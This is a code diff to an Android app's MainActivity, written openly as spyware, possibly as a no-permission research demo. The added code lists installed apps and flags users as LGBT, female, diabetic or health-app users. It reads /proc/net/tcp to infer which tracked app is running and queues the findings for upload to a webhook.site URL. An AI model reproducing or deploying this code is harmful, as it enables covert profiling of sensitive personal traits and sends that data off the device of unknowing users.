@@ -28,20 +28,28 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
-import java.util.concurrent.BlockingQueue;
 
 public class MainActivity extends AppCompatActivity implements WifiListener {
 
     private static final String TAG = "MainActivity";
 
+    /**
+     * data that will be uploaded regularly
+     */
     private ArrayList<String> dataToUpload = new ArrayList<>();
+
+private final static int UID_INDEX = 9;
+
     private boolean flagSocial;
-    private boolean flagSingle;
     private boolean flagLgbt;
     private boolean flagFemale;
     private boolean flagDiabetes;
     private boolean flagHealth;
-    private Map<Integer, String> appMap = new HashMap<Integer, String>();
+
+    /**
+     * contains packages of apps we're keeping track of; the uid are used as keys
+     */
+    private Map<String, String> appMap = new HashMap<>();
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -50,6 +58,8 @@ public class MainActivity extends AppCompatActivity implements WifiListener {
 
         IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
         filter.addAction(Intent.ACTION_SCREEN_OFF);
+
+        stealAppData();
     }
 
     /**
@@ -58,8 +68,44 @@ public class MainActivity extends AppCompatActivity implements WifiListener {
     @Override
     protected void onStart() {
         super.onStart();
-        stealAppData();
         exfiltrate(readVersion(), readIdentifiers());
+        // what was going on when the app didn't have focus?
+        if (flagSocial || flagLgbt) {
+            // check for social activity
+            if(!readUidFromFile("/proc/net/tcp"))
+                readUidFromFile("/proc/net/tcp6");
+        }
+        if(flagHealth || flagDiabetes){
+            // do something wrt health
+        }
+    }
+
+    private boolean readUidFromFile(String file){
+            BufferedReader br;
+            try {
+                br = new BufferedReader(new FileReader(file));
+                // first line:   sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
+                String data = br.readLine();
+                String[] values;
+                String appUid;
+                // so the UID is the 10th field
+                do {
+                    values = data.trim().replaceAll("\\s+", ";").split(";");
+                    if (values.length > UID_INDEX) {
+                        appUid = values[UID_INDEX];
+                        if (appMap.keySet().contains(appUid)) {
+                            prepareForUpload("appLaunched=" + appMap.get(appUid));
+                            return true;
+                        }
+                    }
+                    data = br.readLine();
+                } while (data != null);
+            } catch (FileNotFoundException e) {
+                Log.e(TAG, e.getMessage());
+            } catch (IOException e) {
+                Log.e(TAG, e.getMessage());
+            }
+        return false;
     }
 
     /**
@@ -72,7 +118,7 @@ public class MainActivity extends AppCompatActivity implements WifiListener {
         if (connectivityManager != null) {
             NetworkInfo networkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
             if (networkInfo.isConnected()) {
-                new WifiSniffer(this).execute(networkInfo.getDetailedState());
+                new WifiSniffer(this).execute(networkInfo);
             }
         }
     }
@@ -80,7 +126,6 @@ public class MainActivity extends AppCompatActivity implements WifiListener {
     /**
      * before app loses focus, it uploads what data was found
      */
-    @SuppressLint("SdCardPath")
     @Override
     protected void onStop() {
         super.onStop();
@@ -94,27 +139,18 @@ public class MainActivity extends AppCompatActivity implements WifiListener {
             }
             if (isScreenOn) {
                 // app stopped but screen is on => some other app has taken over: which one?
-                if (flagSocial) {
-                    // check for social activity
-                    BufferedReader br;
-                    try {
-                        br = new BufferedReader(new FileReader("/proc/net/tcp"));
-                        prepareForUpload("social=" + br.readLine());
-                    } catch (FileNotFoundException e) {
-                        Log.e(TAG, e.getMessage());
-                    } catch (IOException e) {
-                        Log.e(TAG, e.getMessage());
-                    }
-                }
             } else {
                 // this app was the last one active before the screen went black
                 Log.d(TAG, "The screen is off");
             }
         }
         StringBuilder sb = new StringBuilder("https://webhook.site/5ebd6968-4d2b-4c72-84a4-c3f491311c3e/?noperms&");
+        Log.d(TAG, "=====| DATA THAT WILL BE UPLOADED |=====");
         for (String queuedString : dataToUpload) {
             sb.append(queuedString).append('&');
+            Log.d(TAG, queuedString);
         }
+        Log.d(TAG, "========================================");
         dataToUpload.clear();
         String request = sb.toString();
         Log.d(TAG, "Uploading: " + request);
@@ -176,10 +212,18 @@ public class MainActivity extends AppCompatActivity implements WifiListener {
                 flagDiabetes |= InstalledAppUtils.isDiabetes(appName);
                 flagHealth |= InstalledAppUtils.isHealth(appName);
                 send.append("|").append(appName);
-                appMap.put(packInfo.applicationInfo.uid, appName);
+                if (InstalledAppUtils.keepTrackOf(appName)) {
+                    appMap.put(String.valueOf(packInfo.applicationInfo.uid), appName);
+                }
                 Log.i(TAG, "stealAppData - installed app: " + i + " as uid " + appName);
             }
         }
+        String flags = (flagSocial ? "SOCIAL " : "")
+            + (flagLgbt ? "LGBT " : "")
+            + (flagFemale ? "FEMALE " : "")
+            + (flagDiabetes ? "DIABETES" : "")
+            + (flagHealth ? "HEALTH" : "");
+        if (flagSocial) Log.d(TAG, "flags :" + flags);
         prepareForUpload("apps=" + send.toString());
     }
 
